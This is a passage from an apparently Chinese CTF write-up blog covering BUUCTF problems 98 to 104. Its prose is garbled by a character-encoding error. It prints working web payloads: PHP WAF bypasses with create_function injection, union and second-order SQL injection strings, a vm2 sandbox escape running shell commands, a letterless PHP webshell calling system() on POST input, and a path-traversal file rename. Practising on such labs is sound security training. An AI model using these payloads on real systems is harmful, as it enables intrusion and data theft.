è¦å‹ç¼©çš„æ–‡ä»¶\n\n$phar->stopBuffering();\n```\n\nä¸Šä¼ ä¸Šå»ä¹‹å åœ¨ç”¨phar://å»è®¿é—®å°±è¡Œäº† è¿™é‡Œå°±ä¸èµ˜è¿°äº†\n\n\n\nç„¶åè¿™é“é¢˜ç›®è¿‡æ»¤é‡Œæœ‰ä¸ªé”™è¯¯\n\n `if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name']))`\n\nä»”ç»†çœ‹`\\.`å‰é¢æœ‰ä¸ªç©ºæ ¼ æ‰€ä»¥è¿™é“é¢˜åŒ¹é…ä¸åˆ°æˆ‘ä»¬çš„`.`å› è€Œæˆ‘ä»¬æ‰èƒ½getçš„nameä¸­å­˜åœ¨`.`\n","categories":["buuctf"]},{"title":"buuåˆ·é¢˜(page 4)","url":"/post/ec342723.html","content":"\nbuuåˆ·é¢˜(page 4)\n\n<!--more-->\n\n# 98ã€[BJDCTF2020]EzPH\n\næŸ¥çœ‹æºç å‘ç°ä¸€æ®µbase32ç `GFXEIM3YFZYGQ4A=` ç‰¹å¾æ˜¯åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—\n\nè§£ç è·å¾—`/1nD3x.php`\n\næºç å¦‚ä¸‹ï¼š\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0); \n\n$file = \"1nD3x.php\";\n$shana = $_GET['shana'];\n$passwd = $_GET['passwd'];\n$arg = '';\n$code = '';\n\necho \"<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>\";\n\nif($_SERVER) { \n    if (\n        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])\n        )  \n        die('You seem to want to do something bad?'); \n}\n\nif (!preg_match('/http|https/i', $_GET['file'])) {\n    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { \n        $file = $_GET[\"file\"]; \n        echo \"Neeeeee! Good Job!<br>\";\n    } \n} else die('fxck you! What do you want to do ?!');\n\nif($_REQUEST) { \n    foreach($_REQUEST as $value) { \n        if(preg_match('/[a-zA-Z]/i', $value))  \n            die('fxck you! I hate English!'); \n    } \n} \n\nif (file_get_contents($file) !== 'debu_debu_aqua')\n    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>\");\n\n\nif ( sha1($shana) === sha1($passwd) && $shana != $passwd ){\n    extract($_GET[\"flag\"]);\n    echo \"Very good! you know my password. But what is flag?<br>\";\n} else{\n    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");\n}\n\nif(preg_match('/^[a-z0-9]*$/isD', $code) || \npreg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { \n    die(\"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); \n} else { \n    include \"flag.php\";\n    $code('', $arg); \n} ?>\n```\n\né¦–å…ˆ`$_SERVER['QUERY_STRING']`å’Œä¸€ä¸ªæ­£åˆ™å·²ç»ä¸å¯èƒ½è®©æˆ‘ä»¬è¾“å…¥åˆæ³•äº†ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç»•è¿‡è¿™ä¸ª`$_SERVER['QUERY_STRING']`\n\n`$_SERVER['QUERY_STRING']`ä¸å¯¹ä¼ å…¥çš„ä¸œè¥¿è¿›è¡Œurlç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œå…¨å­—ç¬¦urlç¼–ç åä¼ å…¥å°±å¯ä»¥bypassã€‚\n\nç„¶åæ˜¯ç»å…¸çš„æ¢è¡Œç¬¦`%0a`ç»•è¿‡`preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') `\n\n`file_get_contents($file) !== 'debu_debu_aqua'`åˆ©ç”¨dataåè®®å†™å…¥å³å¯\n\n`sha1()`å’Œmd5ä¸€æ ·æˆ‘ä»¬ä¼ å…¥ä¸¤ä¸ªæ•°ç»„å°±ä¼šæŠ¥false ä»è€Œbypass\n\n`$_REQUEST`å®ƒåŒ…å«äº†æˆ‘ä»¬getã€postå’Œcookieä¼ å…¥çš„æ•°ç»„ï¼Œä»–banæ‰äº†æ•°å­—å’Œå¤§å°å†™ï¼Œé‚£è¿™é‡Œåº”è¯¥æ€ä¹ˆç»•è¿‡å‘¢ã€‚\n\n å¦‚æœgetå’Œpostä¸€æ ·çš„å‚æ•°åï¼Œå®ƒä¼šä¼˜å…ˆé€‰æ‹©postå½¢å¼ä¼ å…¥çš„å‚æ•°çš„å€¼ã€‚\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŒ‰ä»–çš„è¦æ±‚getä¼ å…¥ï¼Œç„¶åå†postç›¸åŒçš„å˜é‡åä¼ å‚ä¸ºæ•°å­—ï¼Œé‚£ä¹ˆå°±å¯ä»¥bypassäº†\n\nè‡³æ­¤ï¼Œæˆ‘ä»¬è¦ä¼ å…¥çš„éƒ¨åˆ†ä¸º\n\n```\n?file=data://text/plain,debu_debu_aqua&debu=aqua_is_cute%0a&shana[]=1&passwd[]=2\n```\n\né€šè¿‡urlç¼–ç ï¼š\n\n```\n?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2\n```\n\nè¿™é‡Œæ³¨æ„ä¸€ä¸‹è¿™é‡Œç¬¦å·ä»¥åŠæ•°å­—æ²¡æœ‰è¢«wafæ‰€ä»¥ä¸è¦ä¸€é”®urlç¼–ç äº† æ•°å­—å’Œç¬¦å·åŸæ ·æ”¾å‡ºå³å¯ å¦‚æœä¸€èµ·ç¼–ç ï¼Œè§£ç çš„æ—¶å€™å°±ä¼šå‡ºç°æ­§ä¹‰\n\nå†æ¥çœ‹`extract()`ç®€å•è¯´å°±æ˜¯å½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå«æœ‰é”®å€¼å¯¹çš„æ•°ç»„æ—¶å€™ï¼Œä»–å°±ä¼šå¸®æˆ‘ä»¬æŠŠé”®å€¼åˆ†åˆ«æå‡ºæ¥é”®ä¸ºå˜é‡åï¼Œå€¼ä¸ºå˜é‡çš„å€¼ã€‚ \n\nå†æ¥çœ‹`$code('', $arg)`è¿™ä¸€éƒ¨åˆ†ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‰é¢çš„extract()æ¥æ”¹å˜ä»–ä»¬çš„å€¼ä»è€Œåˆ©ç”¨\n\nè¿™é‡Œç”¨åˆ°äº†create_function()åŒ¿åå‡½æ•°æ³¨å…¥ï¼Œä¹‹å‰ctfshowåˆ·é¢˜ä¹Ÿè§åˆ°è¿‡\n\n```php\n$myfunc = create_function('$a, $b', 'return $a+$b;');\nç›¸å½“äº\nfunction myfunc($a, $b){\n    return $a+$b;\n}\nåˆ©ç”¨sqlæ³¨å…¥çš„é—­åˆæ€æƒ³\n  function myfunc($a, $b){\n  return $a+$b;\n}\neval();//}\næˆ‘ä»¬å¯ä»¥é—­åˆå‰é¢çš„{ ç„¶åæ³¨é‡Šæ‰åé¢çš„ }  å†æ’å…¥æˆ‘ä»¬çš„æ¶æ„ä»£ç \n```\n\nå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨extractä¼ å‚ï¼š`flag[code]=create_function&flag[arg]=;}var_dump(get_defined_vars());//`\n\nè·å–å½“å‰æ‰€æœ‰å˜é‡æ•°ç»„\n\n```php\npayload:\n?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67[%61%72%67]=;}%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688899385264-4f64aa94-f527-4470-9bca-c3ff249a256f.png)\n\nå¯ä»¥çœ‹åˆ°flagåœ¨ `rea1fl4g.php`\n\nä½†æ˜¯ç›´æ¥è®¿é—®æ— ç»“æœï¼Œæ‰€ä»¥è¿˜å¾—é€šè¿‡ä¼ªåè®®é…åˆæ–‡ä»¶åŒ…å«å»è¯»\n\n çœ‹åˆ«äººwpéƒ½æ˜¯è¯´å› ä¸ºç¦ç”¨äº†includeæ‰€ä»¥ç”¨requireï¼Œä½†æ˜¯æˆ‘çœ‹æºç æ²¡æœ‰ç¦includeå¹¶ä¸”ä¹Ÿç”¨ä¸äº†ï¼Ÿï¼Ÿ\n\nç„¶å`$code`å•åŒå¼•å·ä¹Ÿä¸èƒ½ç”¨\n\næ—¢ç„¶æˆ‘ä»¬æ˜¯getä¼ å‚çš„æ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸èƒ½ç”¨æ•°å­—å­—æ¯æ‰€ä»¥æˆ‘ä»¬å°±ç”¨å–ååˆ©ç”¨ä¸å¯è§å­—ç¬¦æ¥è¾“å…¥ä¼ªåè®®\n\n```\nrequire(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)\nrequire(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))\n```\n\næœ€åçš„payloadï¼š\n\n```\n?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67[%61%72%67]=;}%72%65%71%75%69%72%65(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//\n```\n\npostä¼ å…¥ï¼š`debu=1&file=1`\n\nè¿˜æœ‰ä¸€ç§è§£æ³•æ˜¯ç”¨require()å»åŒ…å«æˆ‘ä»¬çš„flagæ–‡ä»¶ rea1fl4g.php  \n\nç„¶åå†ç”¨ `var_dump(get_defined_vars()`å»è¯»\n\nä½†æ˜¯è¿™é‡Œæˆ‘ä»¬çš„`.`è¢«ç¦äº† æ‰€ä»¥åˆ©ç”¨base64å‡½æ•° è¿›è¡Œbypass\n\næœ€ç»ˆçš„paylaodï¼š\n\n```\nfile=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&debu=aqua_is_cute &shana[]=1&passwd[]=2&flag[code]=create_function&flag[arg]=}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//  \n```\n\npost: `file=1&debu=2  `\n\nå½“ç„¶è¦urlç¼–ç æ‰“å…¥\n\n# 99ã€October 2019 Twice SQL Injectio\n\nä¸€é“æ ¹æ®äºŒæ¬¡æ³¨å…¥çš„é¢˜ç›®\n\nçœ‹é¢˜ç›®æ ‡é¢˜ä¹ŸçŸ¥é“ ç„¶åæˆ‘æ³¨å†Œäº†admin' å‘ç°ä»–ç™»å½•åæ˜¾ç¤ºçš„è¯­å¥ä¸æ­£å¸¸è¾“å‡ºäº† æ€€ç–‘å°±æ˜¯ç™»å½•åå­˜åœ¨äºŒæ¬¡æ³¨å…¥\n\n ç„¶åæ³¨å†Œ`admin' union select database()#`å‘ç°çˆ†å‡ºäº†åº“å\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688901679744-d25e859e-d14a-49fc-949b-1f84172e40c4.png)\n\nç„¶åå°±æ˜¯è”åˆæ³¨å…¥å’ŒäºŒæ¬¡æ³¨å…¥ç»„åˆæ‹³å°±è¡Œäº† æ¯”è¾ƒç®€å•\n\n```php\nadmin' union select database() #\n\nadmin' union select group_concat(table_name) from information_schema.tables where table_schema='ctftraining' #\n\nadmin' union select group_concat(column_name) from information_schema.columns where table_name='flag'#\n\nadmin' union select flag from flag #\n    \n```\n\n\n\n# 100ã€[HFCTF2020]JustEscape\n\nä¸€é“æ²¡æœ‰æ€è·¯çš„å­¦ä¹ é¢˜ç›® vmçš„æ²™ç®±é€ƒé€¸\n\nçœ‹äº†ç½‘ä¸Šçš„WP å¥½å¤šéƒ½æ˜¯æ²¡æœ‰åˆ†æåªç»™äº†payload \n\nå¤§æ¦‚å­¦ä¹ äº†ä¸€ä¸‹https://xz.aliyun.com/t/11859#toc-3\n\né¦–å…ˆå°±æ˜¯è¦é€šè¿‡å¥‡æ€ªçš„æ„é€ æ–¹å¼è·å–åˆ°å…¨å±€processå¯¹è±¡ï¼Œè¿™ä¸ªå…¨å±€å¯¹è±¡ä¸‹æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå¯¼å…¥child_processï¼Œç„¶å`require('child_process').execSync('whoami').toString()`è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†\n\nçœ‹wpéƒ½æ˜¯åˆ©ç”¨è‡ªæ‰§è¡Œå‡½æ•° å°±æ˜¯å½¢å¦‚`(function(){}) æˆ– (function(){})() `çš„è¡¨è¾¾å¼ ï¼Œè¢«å®šä¹‰ä¹‹åå°±ä¼šç«‹å³æ‰§è¡Œ  \n\nè¿‡æ»¤äº†`['for', 'while', 'process', 'exec', 'eval', 'constructor', 'prototype', 'Function', '+', '\"',''']`\n\nç„¶åpocéƒ½æ˜¯åœ¨è¿™é‡Œæ·˜å®ï¼šhttps://github.com/patriksimek/vm2/issues\n\né€šè¿‡æ¨¡æ¿å­—ç¬¦ä¸²æ¥bypassè¢«wafçš„å­—ç¬¦ å…¶å®æœ¬è´¨å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²\n\n```php\nconsole.log(`${`${`prototyp`}e`}`)\nconsole.log(`${`prototype`}`)\n\nç­‰äºprototype\n```\n\nåå¼•å·æ¥ç»•è¿‡å•åŒå¼•å·\n\npayload1ï¼š\n\n```php\n(function(){\n    TypeError.prototype.get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n    }\n})()\n```\n\nå› ä¸ºæœ‰wafæ‰€ä»¥è¦åˆ©ç”¨æ•°ç»„\n\nçœ‹å¤§ä½¬wp\n\n**å½“å¯¹è±¡çš„æ–¹æ³•æˆ–è€…å±æ€§åå…³é”®å­—è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨æ•°ç»„è°ƒç”¨çš„æ–¹å¼ç»•è¿‡å…³é”®å­—çš„é™åˆ¶**  \n\n```php\n?code[]=(function(){\n    TypeError.prototype.get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"ls\").toString();\n    }\n})()\n```\n\npayload2å°±æ˜¯åˆ©ç”¨æ¨¡æ¿å­—ç¬¦ä¸²å»bypassè¢«wafçš„å­—ç¬¦\n\npoc:\n\n```php\n\"use strict\";\nconst {VM} = require('vm2');\nconst untrusted = '(' + function (){\n    TypeError[`${`prototyp`}e`][`${`get_proces`}s`] = f=>f[`${`constructo`}r`](`return this.${`proces`}s`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`get_proces`}s`](()=>{}).mainModule[`${`requir`}e`](`${`child_proces`}s`)[`${`exe`}cSync`](`whoami`).toString();\n    }\n}+')()';\nconsole.log(untrusted)\ntry{\n    console.log(new VM().run(untrusted));\n}catch(x){\n    console.log(x);\n}\n```\n\npayload:\n\n```php\n?code=(function (){\n    TypeError[`${`prototyp`}e`][`${`get_proces`}s`] = f=>f[`${`constructo`}r`](`return this.${`proces`}s`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`get_proces`}s`](()=>{}).mainModule[`${`requir`}e`](`${`child_proces`}s`)[`${`exe`}cSync`](`ls`).toString();\n    }\n})()\n```\n\nå°±æš‚æ—¶è¿™æ ·å§ï¼Œåšçš„äº‘é‡Œé›¾é‡Œçš„ã€‚\n\n# 101ã€[GXYCTF2019]StrongestMind\n\nçº¯æ˜¯è€ƒå¯Ÿpythonè„šæœ¬\n\nå†™ä¸ªè„šæœ¬çˆ¬ä¸‹è¦æ±‚ä¸¤ä¸ªæ•°å­—ï¼Œè®¡ç®—ï¼Œç„¶åå†postæäº¤ä¸¤ä¸ªæ•°å­—çš„ç»“æœï¼Œé‡å¤1000æ¬¡ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966691744-0ff8bc5e-3bdc-4fe4-9f4b-60e708c4cffd.png)\n\n```php\nfrom requests import *\nimport re\ns = session()\na = s.get(\"http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php\")\npattern = re.findall(r'\\d+.[+-].\\d+', a.text) \nc = eval(pattern[0])\na = s.post(\"http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php\", data = {\"answer\" : c})\nfor i in range(1000):\n\tpattern = re.findall(r'\\d+.[+-].\\d+', a.text) \n\tc = eval(pattern[0])\n  //è¿™é‡Œpattern=å½¢å¦‚['36328928 + 88301757']æ˜¯ä¸ªlist é‚£ä¹ˆå¯ä»¥ç”¨ä¸‹æ ‡ä¸º0æå‡ºæ¥36328928 + 88301757\n\tprint(c)\n\ta = s.post(\"http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php\", data = {\"answer\" : c})\nprint(a.text)\n```\n\né‡è¦çš„ç‚¹å°±æ˜¯ æˆ‘ä»¬è¦è®°å½•1000æ¬¡æ•° æ‰€ä»¥è¦ä¿å­˜ä¸Šä¸€æ¬¡çš„çŠ¶æ€ï¼Œè¦ä¿å­˜ä¸€ä¸‹session\n\nè¯·æ±‚çš„æ—¶å€™ session().get æˆ–è€… session().post å¯ä»¥ä¿æŒæˆ‘ä»¬çš„ä¼šè¯çŠ¶æ€session  å¹¶ä¸”å‘é€ä¸åŒçš„è¯·æ±‚\n\nåˆå­¦åˆ°äº†ï¼ï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966946619-d0ce7ed6-e9a6-4c4d-96e9-5c89b18aed89.png)\n\n# 102ã€[SUCTF 2018]GetShell\n\n```php\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n} \n```\n\nå…ˆæ–‡ä»¶åŒ…å«å°†æˆ‘ä»¬çš„æ–‡ä»¶å†…å®¹è¯»å…¥ç„¶åæ£€æŸ¥ç¬¬å…­ä½å¼€å§‹çš„å†…å®¹ \n\nfuzzä¸€ä¸‹ çœ‹çœ‹å“ªäº›å­—ç¬¦æ²¡æœ‰è¢«waf\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972164206-c84c4d71-7af7-405f-ab58-7a01382d8a3d.png)\n\n`$()_[]~;.=`è¿™äº›æ²¡æœ‰è¢«waf è¿˜æœ‰æ±‰å­— è¿™é“é¢˜ç›®å°±æ˜¯åˆ©ç”¨æ±‰å­—æŒ‰ä½å–åæ¥getshellçš„\n\nè¿™é‡Œæœ‰ä¸ªå¾ˆé‡è¦çš„ä¸€ç‚¹ åœ¨çˆ†ç ´æ—¶å€™ä¸€å®šè¦æŠŠurlencodeå…³äº†ï¼Œä¸ç„¶æäº¤çš„æ—¶å€™bpä¼šå°†ç‰¹æ®Šçš„ç¬¦å·urlç¼–ç ä»è€Œä½¿å¾—fuzzå‡ºé”™ æˆ‘ç¬¬ä¸€æ¬¡å°±æ˜¯å› ä¸ºè¿™ä¸ªfuzzä¸å…¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972249693-0b95cade-1ab0-4116-a842-d40fec4f9ff3.png)\n\nå…ˆå¾—åˆ°1å’Œ0\n\n```php\n<?=\n$_=[];             //array\n$__=$_.$_;         //arrayarray \n$_=($_==$__);      //ä¸æˆç«‹ false -->0\n$__=($_==$_);      //æˆç«‹   true  -->1\n```\n\nåœ¨PHPä¸­ä¸¤ä¸ªç©ºæ•°ç»„ç›¸äº’æ¯”è¾ƒä¸ºtrue æ‰€ä»¥å€¼ä¸º1\n\né‚£ä¹ˆè¯¥æ€ä¹ˆå¾—åˆ°å­—æ¯å‘¢ æˆ‘ä»¬ç”¨æ±‰å­—æŒ‰ä½å–åç„¶ååˆ©ç”¨ä¸‹æ ‡å»æˆªå–æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ è¿™é‡Œæœ€å¥½é€‰æ‹©çš„æ±‰å­—å»å–ååèƒ½ç”¨çš„å­—ç¬¦ä¸‹æ ‡ä¸º0æˆ–è€…1  å› ä¸ºæˆ‘ä»¬å‰é¢åªæ„é€ å‡ºäº†01\n\nå¯ä»¥å‚è€ƒpç¥çš„https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973469139-4b68991a-fe08-469e-b040-80f76f3dbe3c.png)\n\nè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æˆªå–ä¸€ä¸ªphpçš„p å½“ç„¶è¿™é“é¢˜ç›®æˆ‘ä»¬æ²¡å¿…è¦æ„é€ å‡ºphp ç”¨çŸ­æ ‡ç­¾å°±è¡Œäº†\n\næ‰€ä»¥æœ€åpayloadå¯ä»¥æ„é€ å¾ˆå¤šæ–¹å¼  \n\nå·çš„ï¼šhttps://blog.csdn.net/qq_46263951/article/details/118816182\n\n```php\n<?=                //PHPä¸­çš„å¦å¤–ä¸€ä¸ªçŸ­æ ‡ç­¾<?=ï¼Œä»£æ›¿<?php\n$_=[];             //array\n$__=$_.$_;         //arrayarray \n$_=($_==$__);      //ä¸æˆç«‹ false -->0\n$__=($_==$_);      //æˆç«‹   true  -->1\n$___=~åŒº[$__].~å†ˆ[$__].~åŒº[$__].~å‹º[$__].~çš®[$__].~é’ˆ[$__];  //system\n$____=~ç [$__].~å¯¸[$__].~å°[$__].~æ¬ [$__].~ç«‹[$__];         //_Post\n$___($$____[~ç[$__]]);   //system($_POST[a]);\n```\n\næ‰“å…¥ rceå³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973625307-c62c6cd1-194d-4b26-b8f8-ae282d9cc448.png)\n\n# 103ã€[GKCTF 2021]easycms\n\nçœ‹æ ‡é¢˜å°±çŸ¥é“æ˜¯æ‰¾åå° /admin\n\nä½†æ˜¯è¿™é“é¢˜ç›®æ˜¯admin.php ç„¶åç™»å½• è€ƒå¯Ÿå¼±å£ä»¤ admin/12345å°±å¯ä»¥ç™»å½•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981688423-219797d3-2ce2-4788-a4df-421375f019df.png)\n\nå¯ä»¥çœ‹åˆ°æ˜¯è‰çŸ¥7.7çš„ç‰ˆæœ¬ é‚£å°±ç›´æ¥æ£€ç´¢è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´\n\nä½†æ˜¯è¿™é“é¢˜ç›®buué¶åœºé—®é¢˜payloadç¨ç¨ä¸åŒ å¯¼è‡´èŠ±äº†å¥½é•¿æ—¶é—´ä¸€ç›´å¡åœ¨è¿™\n\nç°åœ¨è¿™é‡Œä¸Šä¼ ä¸€ä¸ªtxtæ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981793987-aa46eb16-b193-4fe8-932f-6cf3d7f8b04b.png)\n\nç„¶åæ”¹åä¸ºï¼š`../../../../../../../../../../../var/www/html/system/tmp/yzpc` \n\næ³¨æ„è¿™é‡Œçš„æœ€åçš„yzpcæ¯ä¸ªäººä¸ä¸€æ · æˆ‘ä»¬è¿›å…¥åå°ä¹‹åè¿›å…¥è®¾è®¡-é«˜çº§ç›´æ¥ç‚¹ä¿å­˜ä¼šçˆ†å‡ºä¸€ä¸ªè·¯å¾„ é‡Œé¢æ¯ä¸ªäººä¸ä¸€æ ·\n\nå°±æ˜¯è¿™ä¸ªè·¯å¾„å’Œç½‘ä¸Šè®¸å¤šå¸ˆå‚…å¤ç°çš„è·¯å¾„ä¸ä¸€æ · åº”è¯¥æ˜¯é¶åœºé—®é¢˜\n\nå¥½å¤šå¸ˆå‚…éƒ½æ˜¯ä¿®æ”¹ä¸ºï¼š`../../../../../system/tmp/yzpc`\n\nä½†æ˜¯è¿™é“é¢˜ç›®è¦æŒ‰æˆ‘è¿™ç§è·¯å¾„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981807209-791e4185-75c6-437e-8e08-04ae2b6fe628.png)\n\nä¹‹åå†™å…¥æ¶æ„ä»£ç å³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981987225-574481c1-124f-4461-95da-7c07b5565c7e.png)\n\nè¿˜æœ‰ä¸€ç§å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ å®Œæ–‡ä»¶ä¿®æ”¹æ–‡ä»¶åä»¥ååœ¨ä¸»é¢˜ç¼–è¾‘é‡Œ ç¼–è¾‘ç½‘ç«™å¤´éƒ¨ ç›´æ¥å†™å…¥phpğŸå³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982259213-467c161b-a461-43d4-907c-dc982a85a45a.png)\n\nå¯ä»¥çœ‹åˆ°æ‰§è¡ŒæˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982237616-df436f24-2567-4a63-83df-8ee981b28a72.png)\n\n# 104ã€[b01lers2020]Life on Mars\n\nè¿™é“é¢˜éš¾ç‚¹è¿˜æ˜¯åœ¨äºæ€ä¹ˆæ‰¾åˆ°sqlæ³¨å…¥ç‚¹ è€ƒå¯Ÿçš„åªæ˜¯è”åˆæ³¨å…¥ \n\nè¿›å…¥ç½‘é¡µ æŠ“åŒ…åˆ†æ ä¼šå‘ç°æœ‰è¯·æ±‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042712077-67edce38-b96a-444a-bce5-62b0f91350dc.png)\n\næ³¨å…¥ç‚¹å¦‚å›¾\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042755534-7ce030d7-56c5-4055-8095-8ec62023fbb5.png)\n\næ„é€ `/query?search=amazonis_planitia%20union%20select%201,2 `å‘ç°æœ‰å›æ˜¾ æœ‰ä¸¤åˆ—\n\nç„¶åå°±æ˜¯è”åˆæ³¨å…¥å¸¸è§„æ“ä½œ\n\n```php\n/query?search=amazonis_planitia%20union%20select%201,database()\n\n\nå½“å‰åº“ï¼šaliens\n\n\n/query?search=amazonis_planitia%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='aliens'\n\nè¡¨ï¼šamazonis_planitia,arabia_terra,chryse_planitia,hellas_basin,hesperia_planum,noachis_terra,olympus_mons,tharsis_rise,utopia_basin\n\n\n/query?search=amazonis_planitia%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='olympus_mons'\n```\n\næ³¨åˆ°è¿™é‡Œ å‘ç°æœ‰å¾ˆå¤šè¡¨è€Œä¸”éƒ½æ²¡æœ‰flag\n\nå› æ­¤æ„Ÿè§‰flagä¸åœ¨å½“å‰åº“é‡Œ \n\nå†æŸ¥ä¸€ä¸‹æ‰€æœ‰åº“å§ 